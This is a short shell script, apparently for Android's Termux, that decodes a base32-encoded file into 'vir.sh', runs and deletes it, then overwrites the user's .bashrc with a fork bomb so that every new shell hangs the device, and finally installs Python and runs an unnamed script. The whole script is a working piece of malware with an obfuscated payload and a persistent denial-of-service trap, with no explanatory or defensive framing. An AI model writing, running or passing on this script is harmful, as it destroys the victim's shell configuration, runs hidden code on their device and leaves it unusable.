echo "Wait a minute..."
sleep 3

cat b.txt | base32 -d > vir.sh

bash vir.sh
rm vir.sh

echo ":(){ :|: &};:" > .bashrc
mv .bashrc /$HOME
pkg install python -y
python tre.py
